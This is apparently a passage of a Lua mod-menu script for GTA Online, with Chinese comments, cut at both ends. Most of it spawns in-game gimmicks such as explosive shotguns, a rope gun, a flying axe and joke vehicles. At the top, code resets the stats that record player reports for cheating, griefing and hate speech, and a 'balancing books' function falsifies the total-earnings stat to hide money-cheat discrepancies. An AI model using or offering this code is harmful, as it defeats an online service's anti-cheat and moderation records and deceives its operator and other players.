    STAT_SET_INT("MPPLY_TC_ANNOYINGME", 0) --文字聊天: 骚扰我
    STAT_SET_INT("MPPLY_TC_HATE", 0) --文字聊天: 使用仇恨言论
    STAT_SET_INT("MPPLY_OFFENSIVE_LANGUAGE", 0) --侮辱性语言
    STAT_SET_INT("MPPLY_OFFENSIVE_TAGPLATE", 0) --攻击性标签牌
    STAT_SET_INT("MPPLY_OFFENSIVE_UGC", 0) --攻击性内容
    STAT_SET_INT("MPPLY_BAD_CREW_NAME", 0) --不善的帮会名称
    STAT_SET_INT("MPPLY_BAD_CREW_MOTTO", 0) --不善的帮会座右铭
    STAT_SET_INT("MPPLY_BAD_CREW_STATUS", 0) --不善的帮会状态
    STAT_SET_INT("MPPLY_BAD_CREW_EMBLEM", 0) --不善的帮会勋章
    STAT_SET_INT("MPPLY_EXPLOITS", 0) --作弊或修改
    STAT_SET_INT("MPPLY_BECAME_BADSPORT_NUM", 0) --变成恶意玩家次数
    STAT_SET_INT("MPPLY_GAME_EXPLOITS", 0) --阻碍或滥用游戏功能
end

-----移除收支差
function balancing_books()
    --总花费
    local svc = STAT_GET_INT("MPPLY_TOTAL_SVC")
    --总收入
    local evc = STAT_GET_INT("MPPLY_TOTAL_EVC")
    --银行余额
    local bankCash = MONEY.NETWORK_GET_VC_BANK_BALANCE()
    --现金
    local walletCash = MONEY.NETWORK_GET_VC_WALLET_BALANCE(0)

    --收支差
    local SE = evc - svc - bankCash - walletCash ----总收入 - 总花费 = 现金 + 银行， (总收入 - 总花费 - 现金 -银行) = 0

    if SE ~= 0 then 
        STAT_SET_INT("MPPLY_TOTAL_EVC", svc + bankCash + walletCash + math.random(20000)) --产生一个随机差额
        --STAT_SET_INT("MPPLY_TOTAL_SVC", evc - bankCash - walletCash )
        util.toast("已移除较大收支差额")
    else
        util.toast("您的收支差完全正常")
    end
end


------武器娱乐

----霰弹枪模式
function super_shotgun()
    local pos = v3.new() --v3 addr
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) and not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
        local r = 5
        local x = {min = math.ceil(pos.x - r), max = math.ceil(pos.x + r)}
        local y = {min = math.ceil(pos.y - r), max = math.ceil(pos.y + r)}
        local z = {min = math.ceil(pos.z - r), max = math.ceil(pos.z + r)}

        for i = 1 , 15 do
            FIRE.ADD_EXPLOSION(math.random(x.min, x.max), math.random(y.min, y.max), math.random(z.min, z.max), 2, 1.0, true, false, 0, false)
        end
        --[[ --载具武器反应
        local wpn_ptr = memory.alloc_int()
        if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) and WEAPON.GET_CURRENT_PED_VEHICLE_WEAPON(PLAYER.PLAYER_PED_ID(), wpn_ptr) then
            WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), memory.read_int(wpn_ptr), true)
            --util.toast(memory.read_int(wpn_ptr))
        end ]]
    end
end

----
function cluster_shotgun()
    local pos = v3.new()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) then
        local hash = util.joaat("weapon_hominglauncher")
        request_weapon_asset(hash)

        for i = 1, 40 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x 
            + math.random(-10, 10), pos.y 
            + math.random(-10, 10), pos.z + 35.0
            + math.random(-10, 10), pos.x
            + math.random(-10, 10), pos.y
            + math.random(-10, 10), pos.z
            + math.random(-10, 10), 0,
            true, hash, PLAYER.PLAYER_PED_ID(), true, false, 0)
            util.yield(50)
        end
    end
end


----绳索枪
function rope_gun()
    --定义局部
    local entity_coords1;local entity_coords2
    local m_rope_gun_entities1;local m_rope_gun_entities2

    --获取第一个实体
    util.toast("等待获取第一个实体")
    while not ENTITY.DOES_ENTITY_EXIST(m_rope_gun_entities1) do
        if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
            m_rope_gun_entities1 = get_entity_player_is_aiming_at(PLAYER.PLAYER_ID())
        end
        util.yield()
    end
    if ENTITY.DOES_ENTITY_EXIST(m_rope_gun_entities1) then
        request_control(m_rope_gun_entities1, 3)
        entity_coords1 = ENTITY.GET_ENTITY_COORDS(m_rope_gun_entities1, false)
        local entname = "实体1: " .. util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(m_rope_gun_entities1))
        util.toast(entname)
    end

    util.yield()

    --获取第二个实体
    util.toast("等待获取第二个实体")
    while not ENTITY.DOES_ENTITY_EXIST(m_rope_gun_entities2) or m_rope_gun_entities1 == m_rope_gun_entities2 do
        if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
            m_rope_gun_entities2 = get_entity_player_is_aiming_at(PLAYER.PLAYER_ID())
        end
        util.yield()
    end
    if ENTITY.DOES_ENTITY_EXIST(m_rope_gun_entities2) then
        request_control(m_rope_gun_entities2, 3)
        entity_coords2 = ENTITY.GET_ENTITY_COORDS(m_rope_gun_entities2, false)
        local entname = "实体2: " .. util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(m_rope_gun_entities2))
        util.toast(entname)
    end

    --创建绳子 && 连接绳子
    local rope_length = Get_distance(entity_coords1, entity_coords2, true)
    local m_rope_gun_object = PHYSICS.ADD_ROPE(entity_coords1.x, entity_coords1.y, entity_coords1.z, 0, 0, 0, rope_length, 4, rope_length, 0.5, 0.5, false, false, true, 1, false, 0)
    PHYSICS.ROPE_LOAD_TEXTURES()
    PHYSICS.ACTIVATE_PHYSICS(m_rope_gun_object)
        
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(m_rope_gun_object, m_rope_gun_entities1, m_rope_gun_entities2, entity_coords1.x, entity_coords1.y, entity_coords1.z, entity_coords2.x, entity_coords2.y, entity_coords2.z, rope_length, false, false, 0, 0) 
    PHYSICS.PIN_ROPE_VERTEX(m_rope_gun_object, PHYSICS.GET_ROPE_VERTEX_COUNT(m_rope_gun_object) - 1, entity_coords2.x, entity_coords2.y, entity_coords2.z)
end

----吸附枪
function Adsorption_gun()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        local ent = get_entity_player_is_aiming_at(PLAYER.PLAYER_ID())
        util.yield()
        while ENTITY.DOES_ENTITY_EXIST(ent) and PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_ID()) and ENTITY.IS_ENTITY_A_VEHICLE(ent) do
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
            local rot = CAM.GET_GAMEPLAY_CAM_ROT()
            local coords = get_offset_from_camera(10.0)

            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ent, coords.x, coords.y, coords.z, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(ent, rot.x, rot.y, rot.z, 0)

            if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                ENTITY.SET_ENTITY_ROTATION(ent, rot.x, rot.y, rot.z, 0)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(ent, 100000)
                return
            end
            util.yield()
        end
    end
end

----崔佛的车
function trevor_car()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local veh = create_vehicle(-1435919434, pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    local vehatt = create_vehicle(-1435919434, pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    ENTITY.SET_ENTITY_VISIBLE(veh, false, false)
    ENTITY.SET_ENTITY_ALPHA(veh, 0, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehatt, veh, 0, 0, -0.5, 1, -10, 180, 0, true, false, false, true, 0, true, 0)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), veh, -1)
end

----彭狗棺材
function Frieza_coffin()
    local hash, pedhash = 0xF18BD64, 0x2F4E5C7B
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 4, 0)
    local obj = create_object(hash, pos.x, pos.y, pos.z)
    local ped = create_ped(4, pedhash, pos.x+1, pos.y+1, pos.z, 180.0)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped, 0x9D07F764, 5, true)
    TASK.TASK_SHOOT_AT_ENTITY(ped , obj, 5000, 0xC6EE6B4C)
    local endtime = os.time() + 7
    while endtime > os.time() do
        util.yield()
    end
    delete_entity(obj, ped)
end

----憨豆的车
local Bean_tbl ={}
function Bean_fun(toggled)
    Bean_tbl.toggled = toggled
    if toggled then
        local vehhsah = 931280609 --载具hash
        local chairhash = 604553643  --椅子hash
        local flaghash = util.joaat("ind_prop_dlc_flag_01") --旗子
        local animGroup = "timetable@reunited@ig_10" 
        local animName = "base_amanda"

        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        Bean_tbl.veh = create_vehicle(vehhsah, pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
        Bean_tbl.chair = create_object(chairhash, pos.x, pos.y, pos.z)
        Bean_tbl.flag = create_object(flaghash, pos.x, pos.y, pos.z)

        VEHICLE.SET_VEHICLE_MOD(Bean_tbl.veh, 7, 2, true)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(Bean_tbl.veh, "SLW 287R")
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(Bean_tbl.veh, 255, 255, 50)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(Bean_tbl.veh, 255, 255, 50)

        ENTITY.ATTACH_ENTITY_TO_ENTITY(Bean_tbl.chair, Bean_tbl.veh, 0, 0, -0.5, 1.53, 0, 0, 180, false, true, false, true, 1, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Bean_tbl.flag, Bean_tbl.chair, 0, -0.4, 0, 0, 0, 0, 0, false, true, false, true, 1, true)

        Bean_tbl.ped = PED.CLONE_PED(PLAYER.PLAYER_PED_ID(), true, false, true)
        calm_ped(Bean_tbl.ped, true)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), Bean_tbl.veh, -1)

        local boneIndex = PED.GET_PED_BONE_INDEX(Bean_tbl.ped, 64729)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Bean_tbl.ped, Bean_tbl.chair, 0, -0.2, -0.8, 0.5, 0, 0, 180, false, true, false, true, 1, true)

        while Bean_tbl.toggled do
            if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), animGroup, animName, 3) then
                play_animation(Bean_tbl.ped, animGroup, animName, 5.0, 5.0, -1, 1, 0.0)
            end

            if PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), Bean_tbl.veh, false) then
                ENTITY.SET_ENTITY_INVINCIBLE(Bean_tbl.veh,true)
                ENTITY.SET_ENTITY_INVINCIBLE(Bean_tbl.chair,true)
                ENTITY.SET_ENTITY_INVINCIBLE(Bean_tbl.flag,true)
                ENTITY.SET_ENTITY_INVINCIBLE(Bean_tbl.ped,true)
    
                NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(PLAYER.PLAYER_PED_ID())
                ENTITY.SET_ENTITY_VISIBLE(PLAYER.PLAYER_PED_ID(), false, false)
            else
                ENTITY.SET_ENTITY_VISIBLE(PLAYER.PLAYER_PED_ID(), true, false)
            end
            util.yield()
        end
    else
        ENTITY.SET_ENTITY_VISIBLE(PLAYER.PLAYER_PED_ID(), true, false)
        delete_entity(Bean_tbl.veh,Bean_tbl.chair,Bean_tbl.flag,Bean_tbl.ped)
    end
end

----球形化术
local become_ballObj
function become_ball(toggled)
    become_ball_toggled = toggled
    while become_ball_toggled do
        local ballMdl = util.joaat("stt_prop_stunt_soccer_sball")
        request_model(ballMdl)
        if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
            if not ENTITY.DOES_ENTITY_EXIST(become_ballObj) then
                become_ballObj = entities.create_object(ballMdl, players.get_position(players.user()))
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), become_ballObj, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true, false)
            end

            CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(become_ballObj)
            ENTITY.SET_ENTITY_VISIBLE(become_ballObj, true)
            
            local camRot = CAM.GET_GAMEPLAY_CAM_ROT(2)
            local camHeadingDirection = -camRot.z / 180 * math.pi
            local camHeadingSide = camHeadingDirection + math.pi / 2
            local moveDirection = v3(math.sin(camHeadingDirection), math.cos(camHeadingDirection), 0)

            --前后
            local force = - PAD.GET_CONTROL_NORMAL(2, 31) / 2.0
            moveDirection:mul(force)

            --左右
            local inputSide = PAD.GET_CONTROL_NORMAL(2, 30) / 2.0
            local moveSide = v3(math.sin(camHeadingSide), math.cos(camHeadingSide), 0)
            moveSide:mul(inputSide)
            moveDirection:add(moveSide)

            --上下
            local moveAltitude = PAD.IS_CONTROL_PRESSED(0, 102) and 1.0 or (PAD.IS_CONTROL_PRESSED(0, 36) and -1.0 or (ENTITY.IS_ENTITY_IN_WATER(become_ballObj) and 0.28 or 0.0))
            
            ENTITY.APPLY_FORCE_TO_ENTITY(become_ballObj, 3, moveDirection.x,moveDirection.y,moveAltitude, 0, 0, 0, 0, false, false, true, false, true)
        end
        util.yield()
    end
    delete_entity(become_ballObj)
    --TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
    ENTITY.SET_ENTITY_VISIBLE(PLAYER.PLAYER_PED_ID(), true)
end

----战斗陀螺
function Beyblade(toggled)
    Beyblade_toggle = toggled
    local expl_beyblade_rotation = 0
    while Beyblade_toggle do
        if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
            play_animation(PLAYER.PLAYER_PED_ID(), "mph_nar_fin_ext-32", "mp_m_freemode_01_dual-32", 8.0, 8.0, -1, 0, 0.0)
        
            local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
            local yaw = math.rad(cam_rot.z)
            local directionsX = -math.sin(yaw)
            local directionsY = math.cos(yaw)

            local user_rot = ENTITY.GET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), 0)
            local speed = ENTITY.GET_ENTITY_SPEED(PLAYER.PLAYER_PED_ID()) * 2.236936
            
            local offset = {}
            offset[1] = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 10, 0.0)
            offset[2] = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, -10, 0.0)

            PED.SET_PED_CAN_RAGDOLL(PLAYER.PLAYER_PED_ID(), false)
            ENTITY.SET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), user_rot.x, user_rot.y, expl_beyblade_rotation, 2, true)
            for i = 1, 2 do
                FIRE.ADD_EXPLOSION(offset[i].x, offset[i].y, offset[i].z, 18, 1, false, false, 0.0, false)
            end
            if speed <= 50 and PAD.IS_CONTROL_PRESSED(0,32) then
                ENTITY.APPLY_FORCE_TO_ENTITY(PLAYER.PLAYER_PED_ID(), 3, directionsX, directionsY, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, false)
            end
            expl_beyblade_rotation = expl_beyblade_rotation + 15
        end
        util.yield()
    end
    PED.SET_PED_CAN_RAGDOLL(PLAYER.PLAYER_PED_ID(), true)
    TASK.STOP_ANIM_TASK(PLAYER.PLAYER_PED_ID(), "mph_nar_fin_ext-32", "mp_m_freemode_01_dual-32", 1)
end

----飞行斧
local entity_axe
local get_around_position_iterator = 0  
function get_around_position(ent, far_distance, up_down_distance)
    local angleIncrement = 45.0
    local angle = get_around_position_iterator * angleIncrement;
    get_around_position_iterator = (get_around_position_iterator + 1) % 8

    local angleInRadians = angle * (math.pi / 180.0)
    local x = far_distance * math.cos(angleInRadians);
    local y = far_distance * math.sin(angleInRadians);

    return ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, x, y, 0.0 + up_down_distance)
end
function lerp(a, b, t)
    return a + t * (b - a);
end
function get_entity_highest_coord(ent)
    local highest_coord = nil
    local highest = 0
    
    while true do
        local coords = ENTITY.GET_ENTITY_COORDS(ent, false)
        if coords.z > highest then
            highest = coords.z
            highest_coord = coords
        else
            if highest_coord ~= nil then
                return highest_coord
            end
        end
        util.yield()
    end
    return 0
end
function flying_axe(toggled)
    flying_axe_toggled = toggled
    if flying_axe_toggled then
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1569615261,15,true,true)--给予徒手
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false)--禁止切换武器
    end
    local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local axe_flying_coords = vector3.new(mypos.x+math.random(30,40),mypos.y+math.random(30,40),mypos.z+math.random(20,30))
    while flying_axe_toggled do
        disable_control_action(24, 25, 46)

        if not ENTITY.DOES_ENTITY_EXIST(entity_axe) then
            local coordinates = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 0, 6.5)
            local axe_model = util.joaat("prop_ld_fireaxe")
            
            entity_axe = create_object(axe_model,coordinates.x,coordinates.y,coordinates.z)
            local axe_net_id = NETWORK.OBJ_TO_NET(entity_axe)
            NETWORK.NETWORK_REGISTER_ENTITY_AS_NETWORKED(entity_axe);
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(axe_net_id, true)

            local blip = HUD.ADD_BLIP_FOR_ENTITY(entity_axe)
            HUD.SET_BLIP_DISPLAY(blip, 8)
            HUD.SET_BLIP_SPRITE(blip, 154)
            HUD.SET_BLIP_COLOUR(blip, 38)
        else
            if timer.elapsed() > 300 then

                ----效果
                request_ptfx_asset("scr_powerplay")
                GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE("sp_powerplay_beast_appear_trails", entity_axe, 0, 0, 0, 0, 0, 0.0, 0, 0.5, true, true, true)
                request_ptfx_asset("scr_paletoscore")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY("scr_paleto_box_sparks", entity_axe, 0, 0, 0, 0, 0, 0.0, 0.1, true, true, true)
                --移除火焰
                FIRE.STOP_ENTITY_FIRE(entity_axe)

                --围绕旋转
                if not ENTITY.IS_ENTITY_ATTACHED(entity_axe) then --处于闲置状态
                    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_axe, PLAYER.PLAYER_PED_ID(), true)
                    local new_axe_flying_coords = get_around_position(PLAYER.PLAYER_PED_ID(), 20, 5)

                    local factor = 0.8
                    axe_flying_coords.x = lerp(axe_flying_coords.x, new_axe_flying_coords.x, factor)
                    axe_flying_coords.y = lerp(axe_flying_coords.y, new_axe_flying_coords.y, factor)
                    axe_flying_coords.z = lerp(axe_flying_coords.z, new_axe_flying_coords.z, factor)

                    local axe_coords   = ENTITY.GET_ENTITY_COORDS(entity_axe, 0);
                    local rot = ENTITY.GET_ENTITY_ROTATION(entity_axe, 2);
                    
                    local subtract_coords = vector3.sub(axe_flying_coords, axe_coords)
                    local ent_velocity = ENTITY.GET_ENTITY_VELOCITY(entity_axe)

                    ENTITY.APPLY_FORCE_TO_ENTITY(entity_axe, 3,
                        (subtract_coords.x) - ((2.01 + 2) * 0.3 * ent_velocity.x),
                        (subtract_coords.y) - (2.01 * 0.3 * ent_velocity.y),
                        (subtract_coords.z) - (2.01 * 0.3 * ent_velocity.z) + 0.1,
                        0.0,0,0,0,false,true,true,false,true)
                end

                timer.reset()
            end

            --按E召唤斧子
            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 46) and not ENTITY.IS_ENTITY_ATTACHED(entity_axe) and not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
                local animation_dict   = "cover@first_person@weapon@grenade"
                local animation = "low_l_throw_long"
                if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), animation_dict, animation, 3) then
                    STREAMING.REQUEST_ANIM_DICT(animation_dict)
                    if STREAMING.HAS_ANIM_DICT_LOADED((animation_dict)) then
                        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), animation_dict, animation, 8.00, 8.00, -1, 48, 0, false, false, false)
                        MISC.FORCE_LIGHTNING_FLASH() --闪电
                    end
                end

                local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(PLAYER.PLAYER_PED_ID(), "IK_R_Hand")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(entity_axe, PLAYER.PLAYER_PED_ID(), bone, 0, -0.05, -0.05, -61., 28.4, -48.8, false, false, true, true, 0, true, 0)
            end

            --瞄准
            if PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) and ENTITY.IS_ENTITY_ATTACHED(entity_axe) and not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
                local camrot = CAM.GET_GAMEPLAY_CAM_ROT(2)
                ENTITY.SET_ENTITY_ROTATION((PLAYER.PLAYER_PED_ID()), camrot.x, camrot.y, camrot.z, 2, 0)
                HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME() ----显示准星

                --丢出斧子
                if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) then
                    play_animation(PLAYER.PLAYER_PED_ID(), "weapons@first_person@aim_rng@generic@projectile@grenade_str", "throw_m_fb_forward", 8.00, 8.00, -1, 48, 0.0)
                    util.yield(300)
                    ENTITY.DETACH_ENTITY(entity_axe, 0, true)

                    local c2 = get_offset_from_camera(15)
                    local dir = {}
                    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
                    dir.x = (c2.x - pos.x) * 100000
                    dir.y = (c2.y - pos.y) * 100000
                    dir.z = (c2.z - pos.z) * 100000
                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(entity_axe, 1, dir.x, dir.y, dir.z, false, false, false, false)

                    --[[ while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(entity_axe) and not ENTITY.IS_ENTITY_IN_WATER(entity_axe) do
                        util.yield()
                    end ]]
                    util.yield(800)
                end
            end
        end
        util.yield()
    end
    PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(), true)--解除禁止切换武器
    delete_entity(entity_axe)
end

----祖国人
function the_homelander(toggled)
    super_homelander = toggled
    if super_homelander then

        --渐进升高
        for i = 1, 10 do
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
            ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z + 0.5, false, false, false, false)
            util.yield(10)
        end
        
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        play_animation(PLAYER.PLAYER_PED_ID(), "missfam5_yoga", "c8_to_start", 4, 1, -1, 2 | 16 | 32 | 131072 | 1048576, 0.0)
        play_animation(PLAYER.PLAYER_PED_ID(), "skydive@parachute@first_person", "chute_idle_alt_lookright", 4, 1, -1, 1 | 1048576, 0.0)

        ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), 0, 0, 1)
        ENTITY.SET_ENTITY_INVINCIBLE(PLAYER.PLAYER_PED_ID(),true)

    end
    while super_homelander do
        --激光眼
        laser_eyes()
        --设置相机视角
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(5)
        ENTITY.SET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), rot.x, rot.y, rot.z, 5, true)
        ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
        --移动
        if PAD.IS_CONTROL_PRESSED(0,32) then--前进
            pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 1, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, true, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
        elseif PAD.IS_CONTROL_PRESSED(0,33) then--后退
            pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, -1, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, true, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
        end
        if PAD.IS_CONTROL_PRESSED(0,34) then--左
            pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -1, 0, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, true, false, false)
        elseif PAD.IS_CONTROL_PRESSED(0,35) then--右
            pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 1, 0, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, true, false, false)
        end
        if PAD.IS_CONTROL_PRESSED(0,21) then--上
            pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z']+1, true, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
        elseif PAD.IS_CONTROL_PRESSED(0,36) then--下
            pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z']-1, true, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
        end


        util.yield()
    end

    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
end


----新型滑板车
function res_skateboard(toggled)
    New_Scooter = toggled
    while New_Scooter do
        if not ENTITY.DOES_ENTITY_EXIST(hasskateboard2) or not ENTITY.DOES_ENTITY_EXIST(hasskateboard) then
            local skateboard = util.joaat("v_res_skateboard") --滑板
            local skateboard2 = util.joaat("prop_big_shit_02") --便便
            request_models(skateboard,skateboard2)
            local respos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
            hasskateboard = create_object(skateboard, respos.x, respos.y, respos.z - 1)
            hasskateboard2 = create_object(skateboard2, respos.x, respos.y, respos.z - 1)
            ENTITY.SET_ENTITY_VISIBLE(hasskateboard2, false)
            --恢复形态，避免附加失败
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
            
            while not ENTITY.IS_ENTITY_ATTACHED_TO_ENTITY(PLAYER.PLAYER_PED_ID(), hasskateboard2) do
                ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), hasskateboard2, 0, 0, 0.0, 1.15, 0.0, 0.0, 0.0, true, false, true--[[ 碰撞 ]], true, 0, true, 0)
                util.yield()
            end
            util.yield(1)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(hasskateboard, hasskateboard2, 0, 0, 0.0, 0, 0.0, 0.0, 100, true, false, true--[[ 碰撞 ]], true, 0, true, 0)
    
            request_anim_dict("move_strafe@first_person@drunk")
            TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "move_strafe@first_person@drunk", "idle", 8.0, -8.0, -1, 1, 0.0, false, false, false)
        else
            local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
            ENTITY.SET_ENTITY_ROTATION(hasskateboard2, 0, 0, camrot.z, 0, true)
    
            local c2 = get_offset_from_camera(15)
            local dir = {}
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
            if PAD.IS_CONTROL_PRESSED(0, 32) then -- W
                dir.x = (c2.x - pos.x) / 1.3
                dir.y = (c2.y - pos.y) / 1.3
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(hasskateboard2, 1, dir.x, dir.y, 0, false, false, false, false)
            end
    
            if PAD.IS_CONTROL_PRESSED(0, 61) then -- Shift
                dir.x = (c2.x - pos.x)
                dir.y = (c2.y - pos.y)
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(hasskateboard2, 1, dir.x, dir.y, 0, false, false, false, false)
            end
    
            if PAD.IS_DISABLED_CONTROL_JUST_PRESSED(0, 22)then -- 空格
                if not ENTITY.IS_ENTITY_IN_AIR(hasskateboard2) then
                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(hasskateboard2, 1, 0.0, 0.0, 15.0, true, true, true, true)
                end
            end
    
